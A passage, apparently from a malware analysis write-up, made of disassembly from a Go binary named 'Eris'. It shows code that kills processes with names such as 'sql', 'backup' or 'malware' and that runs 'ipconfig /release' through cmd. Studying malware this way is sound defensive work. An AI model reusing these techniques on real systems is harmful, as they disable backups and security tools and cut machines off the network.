<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d056</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">sym.type._1_uintptr</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d05c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d05f</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.newobject</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d064</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d068</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_34h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d06c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">eax</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d06e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#ae81ff">0x20</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d075</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#ae81ff">0x68b3dc</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d07b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d07f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">sym.pCloseHandle</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d085</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d089</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d08d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d095</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_14h</span>], <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d09d</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.deferproc</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0a2</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0a4</span>  <span style="color:#66d9ef">jne</span> <span style="color:#ae81ff">0x53d31c</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0aa</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">sym.type.Utils.PROCESSENTRY32</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0b0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0b3</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.newobject</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0b8</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0bc</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_48h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0c0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">eax</span>], <span style="color:#ae81ff">0x22c</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0c6</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">sym.type._2_uintptr</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0cc</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0cf</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.newobject</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0d4</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0d8</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_34h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0dc</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">eax</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0de</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_48h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0e2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">4</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0e5</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">sym.pProcess32FirstW</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0eb</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0ee</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0f2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d0fa</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d102</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.syscall___LazyProc_.Call</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053d107</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>]
</code></pre></div><p>If any of the running processes name contain any of the strings below, it is
killed.</p>
<ul>
<li>sql</li>
<li>backup</li>
<li>malware</li>
<li>server</li>
<li>http</li>
<li>apache</li>
<li>agent</li>
</ul>
<p>Code for killing the processes:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fecdc</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">slice_procs</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fece3</span>  <span style="color:#66d9ef">cmp</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fece5</span>  <span style="color:#66d9ef">jge</span> <span style="color:#ae81ff">0x5fe90b</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005feceb</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_d4h</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fecf2</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">ecx</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">edx</span>*<span style="color:#ae81ff">8</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fecf5</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">ecx</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fecf7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_a4h</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fecfe</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">4</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed01</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_150h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed08</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebp</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">ebx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x10</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed0b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed0e</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">ebp</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed10</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed14</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed18</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed1b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed1f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#ae81ff">0x874b38</span>] <span style="color:#75715e">; List of strings
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005fed25</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#ae81ff">0x874b3c</span>] <span style="color:#75715e">; 7
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005fed2b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#ae81ff">0x874b40</span>] <span style="color:#75715e">; 7
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005fed31</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed35</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed39</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed3d</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.Eris_Utils.Contains</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed42</span>  <span style="color:#66d9ef">movzx</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">var_14h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed47</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">al</span>, <span style="color:#66d9ef">al</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed49</span>  <span style="color:#66d9ef">je</span> <span style="color:#ae81ff">0x5feccb</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed4b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_a4h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed52</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x18</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed55</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_150h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed5c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed5f</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed61</span>  <span style="color:#66d9ef">nop</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed62</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed66</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed69</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.os.findProcess</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed6e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed72</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed76</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed78</span>  <span style="color:#66d9ef">jne</span> <span style="color:#ae81ff">0x5feccb</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed7e</span>  <span style="color:#66d9ef">nop</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed7f</span>  <span style="color:#66d9ef">nop</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed80</span>  <span style="color:#66d9ef">nop</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed81</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#ae81ff">0x874a48</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed87</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#ae81ff">0x874a4c</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed8d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed90</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed94</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fed98</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.os___Process_.signal</span>
</code></pre></div><h3 id="release-of-ip-address">Release of IP address</h3>
<p>If the username ends with <em>$</em>, the IP address for the machine is released:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe90b</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#ae81ff">0x67505a</span>] <span style="color:#75715e">; &#34;USERNAME&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005fe911</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe914</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">8</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe91c</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.os.Getenv</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe921</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe925</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe929</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">ecx</span> - <span style="color:#ae81ff">1</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe92c</span>  <span style="color:#66d9ef">cmp</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe92e</span>  <span style="color:#66d9ef">ja</span> <span style="color:#ae81ff">0x5ff6a5</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe934</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">username_str</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe93b</span>  <span style="color:#66d9ef">sub</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe93d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">username_str_len</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe944</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe946</span>  <span style="color:#66d9ef">neg</span> <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe948</span>  <span style="color:#66d9ef">sar</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#ae81ff">0x1f</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe94b</span>  <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe94d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_d0h</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe954</span>  <span style="color:#66d9ef">cmp</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe957</span>  <span style="color:#66d9ef">jne</span> <span style="color:#ae81ff">0x5fe966</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe959</span>  <span style="color:#66d9ef">movzx</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">edx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">eax</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe95d</span>  <span style="color:#66d9ef">cmp</span> <span style="color:#66d9ef">cl</span>, <span style="color:#ae81ff">0x24</span> <span style="color:#75715e">; &#34;$&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005fe960</span>  <span style="color:#66d9ef">je</span> <span style="color:#ae81ff">0x5fec2d</span>
<span style="color:#a6e22e">...</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fec2d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_190h</span>], <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fec38</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_194h</span>], <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fec43</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">sym.type.string</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fec49</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_190h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fec50</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">ecx</span>, [<span style="color:#ae81ff">0x6cecb0</span>] <span style="color:#75715e">; &#34;ipconfig /release&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005fec56</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_194h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fec5d</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">ecx</span>, [<span style="color:#ae81ff">0x674630</span>] <span style="color:#75715e">; &#34;/C %s&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005fec63</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fec66</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">5</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fec6e</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">var_190h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fec75</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fec79</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fec81</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fec89</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.fmt.Sprintf</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fec8e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_14h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fec92</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fec96</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#ae81ff">0x674d1b</span>] <span style="color:#75715e">; &#34;cmd.exec&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005fec9c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">edx</span>
